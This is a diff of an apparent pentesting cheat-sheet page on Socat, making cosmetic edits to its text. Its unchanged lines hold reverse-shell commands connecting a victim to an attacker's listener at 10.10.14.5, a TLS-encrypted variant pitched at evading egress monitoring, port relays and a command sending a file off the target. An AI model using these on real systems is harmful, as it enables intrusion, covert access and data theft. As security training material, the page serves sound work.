@@ -23,7 +23,7 @@ layout:
 
 # Socat
 
-Socat ("**SO**cket **CAT**") establishes a bidirectional data stream between two independent endpoints — files, pipes, sockets, a terminal, or a running process. Where NetCat gives us a handful of fixed primitives, socat's address syntax lets us combine almost any two endpoints, which makes it one of the more flexible tools in the toolbox for shells, relays, port forwarding and encrypted listeners.
+Socat ("**SO**cket **CAT**") establishes a bidirectional data stream between two independent endpoints - files, pipes, sockets, a terminal, or a running process. Where [netcat.md](../post-exploitation/netcat.md "mention") gives us a handful of fixed primitives, Socat's address syntax lets us combine almost any two endpoints, which makes it one of the more flexible tools in the toolbox for shells, relays, port forwarding and encrypted listeners.
 
 {% hint style="info" %}
 #### Download & Install
@@ -33,9 +33,9 @@ Socat ("**SO**cket **CAT**") establishes a bidirectional data stream between two
 Usually already installed, or available via `apt install socat`.
 {% endhint %}
 
-Every socat command takes the same basic shape — two addresses, with data flowing between them:
+Every Socat command takes the same basic shape - two addresses, with data flowing between them:
 
-```
+```bash
 socat <address1> <address2>
 ```
 
@@ -57,7 +57,7 @@ clue@attacker[~]$ socat TCP-LISTEN:4444,reuseaddr file:`tty`,raw,echo=0
 {% step %}
 ### Trigger the Callback
 
-On the target, provided socat is installed there too:
+On the target, provided Socat is installed there too:
 
 ```bash
 victim@target$ socat TCP:10.10.14.5:4444 EXEC:'bash -li'
@@ -97,7 +97,7 @@ victim@target$ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.
 
 ## Encrypted Reverse Shell
 
-A plain socat shell is sent in the clear, same as NetCat. Where that matters — noisy networks, egress monitoring — we can wrap the connection in TLS.
+A plain Socat shell is sent in the clear, same as NetCat. Where that matters - noisy networks, egress monitoring - we can wrap the connection in TLS.
 
 {% stepper %}
 {% step %}
@@ -134,7 +134,7 @@ victim@target$ socat OPENSSL:10.10.14.5:4444,verify=0 EXEC:'bash -li'
 
 ## Port Forwarding & Relays
 
-Socat is also a convenient way to relay a port from one host to another, without the overhead of a full pivoting tool — useful for a quick one-off relay.
+Socat is also a convenient way to relay a port from one host to another, without the overhead of a full pivoting tool - useful for a quick one-off relay.
 
 ```bash
 clue@attacker[~]$ socat TCP-LISTEN:8080,fork,reuseaddr TCP:172.16.5.19:80
@@ -157,9 +157,3 @@ clue@attacker[~]$ socat TCP-LISTEN:4444,reuseaddr file:incoming_file,create
 # Sending host
 victim@target$ socat TCP:10.10.14.5:4444 file:file_to_send
 ```
-
-***
-
-## Resources
-
-[https://www.dest-unreach.org/socat/doc/socat.html](https://www.dest-unreach.org/socat/doc/socat.html)
